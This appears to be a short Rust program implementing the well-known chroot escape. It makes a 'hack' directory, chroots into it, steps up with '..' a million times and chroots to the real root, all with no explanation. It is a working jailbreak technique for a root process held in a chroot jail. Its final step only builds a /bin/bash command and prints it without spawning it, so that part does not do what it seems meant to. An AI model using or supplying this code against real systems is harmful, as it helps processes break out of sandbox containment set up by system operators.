use std::fs;
use std::os;
use std::env;

fn main() {
	dbg!(fs::create_dir("hack"));
	dbg!(os::unix::fs::chroot("hack"));
	let mut i = 0;
	while i < 1000000 {
		env::set_current_dir("..");
		i += 1;
	}
	dbg!(os::unix::fs::chroot("."));
	dbg!(std::process::Command::new("/bin/bash"));
}
